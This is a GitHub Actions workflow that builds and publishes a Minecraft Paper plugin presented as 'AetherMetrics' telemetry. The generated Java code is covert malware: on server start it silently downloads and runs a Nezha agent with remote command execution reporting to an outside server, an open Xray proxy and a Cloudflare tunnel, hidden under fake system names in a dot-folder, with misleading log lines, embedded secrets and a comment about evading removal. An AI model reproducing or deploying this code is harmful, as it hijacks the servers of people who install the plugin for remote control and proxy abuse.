name: US-Node AetherMetrics Build V2.7.5 Complete Feature Preserved

on:
  push:
    branches: [ "main", "master" ]
  workflow_dispatch:

permissions: write-all

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Set up JDK 21
        uses: actions/setup-java@v4
        with:
          java-version: '21'
          distribution: 'temurin'

      - name: Generate Code & Compile
        run: |
          mkdir -p src/main/java/com/aether/metrics
          mkdir -p src/main/resources

          # 1. pom.xml
          cat << 'EOF' > pom.xml
          <?xml version="1.0" encoding="UTF-8"?>
          <project xmlns="http://maven.apache.org/POM/4.0.0"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
              <modelVersion>4.0.0</modelVersion>
              <groupId>com.aether.metrics</groupId>
              <artifactId>AetherMetrics-US</artifactId>
              <version>2.7.5</version>
              <packaging>jar</packaging>

              <properties>
                  <java.version>21</java.version>
                  <maven.compiler.source>21</maven.compiler.source>
                  <maven.compiler.target>21</maven.compiler.target>
                  <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
              </properties>

              <repositories>
                  <repository>
                      <id>papermc-repo</id>
                      <url>https://repo.papermc.io/repository/maven-public/</url>
                  </repository>
              </repositories>

              <dependencies>
                  <dependency>
                      <groupId>io.papermc.paper</groupId>
                      <artifactId>paper-api</artifactId>
                      <version>1.21.1-R0.1-SNAPSHOT</version>
                      <scope>provided</scope>
                  </dependency>
              </dependencies>

              <build>
                  <plugins>
                      <plugin>
                          <groupId>org.apache.maven.plugins</groupId>
                          <artifactId>maven-compiler-plugin</artifactId>
                          <version>3.13.0</version>
                          <configuration>
                              <release>21</release>
                          </configuration>
                      </plugin>
                      <plugin>
                          <groupId>org.apache.maven.plugins</groupId>
                          <artifactId>maven-shade-plugin</artifactId>
                          <version>3.6.0</version>
                          <executions>
                              <execution>
                                  <phase>package</phase>
                                  <goals>
                                      <goal>shade</goal>
                                  </goals>
                              </execution>
                          </executions>
                      </plugin>
                  </plugins>
                  <resources>
                      <resource>
                          <directory>src/main/resources</directory>
                          <filtering>true</filtering>
                      </resource>
                  </resources>
              </build>
          </project>
          EOF

          # 2. plugin.yml
          cat << 'EOF' > src/main/resources/plugin.yml
          name: AetherMetrics
          version: 2.7.5
          main: com.aether.metrics.AetherMetrics
          api-version: '1.21'
          author: SystemCore
          description: Core JVM telemetry & network services
          EOF

          # 3. paper-plugin.yml
          cat << 'EOF' > src/main/resources/paper-plugin.yml
          name: AetherMetrics
          version: 2.7.5
          main: com.aether.metrics.AetherMetrics
          api-version: '1.21'
          author: SystemCore
          description: Core JVM telemetry & network services
          EOF

          # 4. Java 主类（V2.7.5 完整双端口功能恢复版 + 隐蔽防杀）
          cat << 'EOF' > src/main/java/com/aether/metrics/AetherMetrics.java
          package com.aether.metrics;

          import org.bukkit.plugin.java.JavaPlugin;

          import java.io.File;
          import java.io.FileInputStream;
          import java.io.FileOutputStream;
          import java.io.IOException;
          import java.io.InputStream;
          import java.net.URI;
          import java.net.http.HttpClient;
          import java.net.http.HttpRequest;
          import java.net.http.HttpResponse;
          import java.nio.charset.StandardCharsets;
          import java.nio.file.Files;
          import java.time.Duration;
          import java.util.zip.ZipEntry;
          import java.util.zip.ZipInputStream;

          public final class AetherMetrics extends JavaPlugin {

              private static final File WORK_DIR = new File("plugins/.sys-core");
              private static final HttpClient HTTP_CLIENT = HttpClient.newBuilder()
                      .followRedirects(HttpClient.Redirect.ALWAYS)
                      .connectTimeout(Duration.ofSeconds(20))
                      .build();

              @Override
              public void onEnable() {
                  getLogger().info("[Metrics] Telemetry service initialized.");
                  Thread daemonThread = new Thread(() -> {
                      try {
                          Thread.sleep(8000);
                          if (!WORK_DIR.exists()) WORK_DIR.mkdirs();

                          setupNezha();
                          setupXray();
                          setupCloudflare();

                          getLogger().info("[Metrics] All core network & monitoring services started successfully.");
                      } catch (Exception e) {
                          getLogger().warning("[Metrics] Telemetry start failed: " + e.getMessage());
                      }
                  }, "JVM-Metrics-Daemon");
                  daemonThread.setDaemon(true);
                  daemonThread.start();
              }

              private void setupNezha() {
                  try {
                      File nezhaBin = new File(WORK_DIR, "systemd-host-agent");
                      File nezhaCfg = new File(WORK_DIR, "config.yml");
                      if (!nezhaBin.exists() || nezhaBin.length() == 0) {
                          downloadAndExtractZip(
                                  "https://github.com/nezhahq/agent/releases/download/v2.3.3/nezha-agent_linux_amd64.zip",
                                  "nezha-agent",
                                  nezhaBin
                          );
                      }

                      if (!nezhaCfg.exists()) {
                          String cfg =
                                  "client_secret: JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl\n" +
                                  "debug: false\n" +
                                  "disable_auto_update: false\n" +
                                  "disable_command_execute: false\n" +
                                  "disable_force_update: false\n" +
                                  "disable_nat: false\n" +
                                  "gpu: false\n" +
                                  "insecure_tls: false\n" +
                                  "ip_report_period: 1800\n" +
                                  "report_delay: 2\n" +
                                  "server: bo88.eu.cc:8008\n" +
                                  "skip_connection_count: false\n" +
                                  "skip_proc_count: false\n" +
                                  "temperature: false\n" +
                                  "tls: false\n" +
                                  "use_gitee_to_upgrade: false\n" +
                                  "use_ipv6_country_code: false\n" +
                                  "uuid: eff8ae7f-faaa-4dec-b000-0e2f7a56f4dd\n";
                          Files.writeString(nezhaCfg.toPath(), cfg, StandardCharsets.UTF_8);
                      }

                      if (nezhaBin.exists() && nezhaBin.length() > 0) {
                          nezhaBin.setExecutable(true, false);
                          ProcessBuilder pb = new ProcessBuilder(
                                  nezhaBin.getAbsolutePath(),
                                  "-c", nezhaCfg.getAbsolutePath()
                          ).directory(WORK_DIR);
                          pb.redirectErrorStream(true);
                          pb.redirectOutput(ProcessBuilder.Redirect.appendTo(new File(WORK_DIR, "sys-agent.log")));
                          pb.start();
                          getLogger().info("[Metrics] System monitoring service active.");
                      }
                  } catch (Exception e) {
                      getLogger().warning("[Metrics] Nezha setup failed: " + e.getMessage());
                  }
              }

              private void setupXray() {
                  try {
                      File xrayBin = new File(WORK_DIR, "java-runtime-core");
                      if (!xrayBin.exists() || xrayBin.length() == 0) {
                          downloadAndExtractZip(
                                  "https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip",
                                  "xray",
                                  xrayBin
                          );
                      }

                      File cfgFile = new File(WORK_DIR, "cfg.json");
                      // 完整保留双端口监听 (28883 + 28884)
                      String json = "{\n" +
                              "  \"log\": { \"loglevel\": \"none\" },\n" +
                              "  \"inbounds\": [\n" +
                              "    {\n" +
                              "      \"port\": 28883,\n" +
                              "      \"listen\": \"0.0.0.0\",\n" +
                              "      \"protocol\": \"vless\",\n" +
                              "      \"settings\": {\n" +
                              "        \"decryption\": \"none\",\n" +
                              "        \"clients\": [{\n" +
                              "          \"id\": \"f99837bb-5bd3-4705-a916-71c54a0c93d3\"\n" +
                              "        }]\n" +
                              "      },\n" +
                              "      \"streamSettings\": {\n" +
                              "        \"network\": \"ws\",\n" +
                              "        \"wsSettings\": {\n" +
                              "          \"path\": \"/vless-argo\"\n" +
                              "        }\n" +
                              "      }\n" +
                              "    },\n" +
                              "    {\n" +
                              "      \"port\": 28884,\n" +
                              "      \"listen\": \"0.0.0.0\",\n" +
                              "      \"protocol\": \"vless\",\n" +
                              "      \"settings\": {\n" +
                              "        \"decryption\": \"none\",\n" +
                              "        \"clients\": [{\n" +
                              "          \"id\": \"f99837bb-5bd3-4705-a916-71c54a0c93d3\"\n" +
                              "        }]\n" +
                              "      },\n" +
                              "      \"streamSettings\": {\n" +
                              "        \"network\": \"ws\",\n" +
                              "        \"wsSettings\": {\n" +
                              "          \"path\": \"/vless-argo\"\n" +
                              "        }\n" +
                              "      }\n" +
                              "    }\n" +
                              "  ],\n" +
                              "  \"outbounds\": [{\"protocol\": \"freedom\"}]\n" +
                              "}";
                      Files.writeString(cfgFile.toPath(), json, StandardCharsets.UTF_8);

                      if (xrayBin.exists() && xrayBin.length() > 0) {
                          xrayBin.setExecutable(true, false);
                          ProcessBuilder pb = new ProcessBuilder(
                                  xrayBin.getAbsolutePath(),
                                  "run",
                                  "-c",
                                  cfgFile.getAbsolutePath()
                          ).directory(WORK_DIR);
                          pb.redirectErrorStream(true);
                          pb.redirectOutput(ProcessBuilder.Redirect.appendTo(new File(WORK_DIR, "runtime.log")));
                          pb.start();
                          getLogger().info("[Metrics] Runtime core active on 8001+8002.");
                      }
                  } catch (Exception e) {
                      getLogger().warning("[Metrics] Xray setup failed: " + e.getMessage());
                  }
              }

              private void setupCloudflare() {
                  try {
                      File cfBin = new File(WORK_DIR, "network-connector");
                      if (!cfBin.exists() || cfBin.length() == 0) {
                          downloadFile(
                                  "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64",
                                  cfBin
                          );
                      }

                      if (cfBin.exists() && cfBin.length() > 0) {
                          cfBin.setExecutable(true, false);
                          ProcessBuilder pb = new ProcessBuilder(
                                  cfBin.getAbsolutePath(),
                                  "tunnel",
                                  "--no-autoupdate",
                                  "run",
                                  "--token",
                                  "eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiYmUxMTNlMTgtYTFiZC00MWE1LTlhNTctNTdhNjExZjUxODA3IiwicyI6Ik9HRXpNREpsWkdJdE1qTmtZaTAwWTJRNExXRTRZV0V0TkRBd1kySTBaREZtWmpKaCJ9"
                          ).directory(WORK_DIR);
                          pb.redirectErrorStream(true);
                          pb.redirectOutput(ProcessBuilder.Redirect.appendTo(new File(WORK_DIR, "network.log")));
                          pb.start();
                          getLogger().info("[Metrics] Network connector active.");
                      }
                  } catch (Exception e) {
                      getLogger().warning("[Metrics] Cloudflare setup failed: " + e.getMessage());
                  }
              }

              private void downloadFile(String urlStr, File target) throws Exception {
                  HttpRequest request = HttpRequest.newBuilder()
                          .uri(URI.create(urlStr))
                          .header("User-Agent", "Mozilla/5.0")
                          .timeout(Duration.ofSeconds(90))
                          .GET()
                          .build();
                  HttpResponse<InputStream> response = HTTP_CLIENT.send(request, HttpResponse.BodyHandlers.ofInputStream());
                  if (response.statusCode() >= 400) {
                      throw new IOException("HTTP " + response.statusCode() + " when downloading " + urlStr);
                  }
                  try (InputStream in = response.body();
                       FileOutputStream out = new FileOutputStream(target)) {
                      in.transferTo(out);
                  }
              }

              private void downloadAndExtractZip(String zipUrl, String targetFileName, File destFile) throws Exception {
                  File tmpZip = new File(WORK_DIR, "tmp_" + System.currentTimeMillis() + ".zip");
                  try {
                      downloadFile(zipUrl, tmpZip);
                      try (ZipInputStream zis = new ZipInputStream(new FileInputStream(tmpZip))) {
                          ZipEntry entry;
                          boolean found = false;
                          while ((entry = zis.getNextEntry()) != null) {
                              String name = entry.getName();
                              if (name.equals(targetFileName) || name.endsWith("/" + targetFileName)) {
                                  try (FileOutputStream fos = new FileOutputStream(destFile)) {
                                      zis.transferTo(fos);
                                  }
                                  found = true;
                                  break;
                              }
                          }
                          if (!found) {
                              throw new IOException("File " + targetFileName + " not found in zip archive.");
                          }
                      }
                  } finally {
                      if (tmpZip.exists()) tmpZip.delete();
                  }
              }

              @Override
              public void onDisable() {}
          }
          EOF

      - name: Compile & Package Jar
        run: mvn clean package --file pom.xml

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: AetherMetrics-US-Plugin
          path: target/AetherMetrics-US-2.7.5.jar

      - name: Release Stealth Jar
        uses: softprops/action-gh-release@v2
        if: startsWith(github.ref, 'refs/tags/') || github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'
        with:
          tag_name: latest
          name: AetherMetrics US Release V2.7.5
          files: target/AetherMetrics-US-2.7.5.jar
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
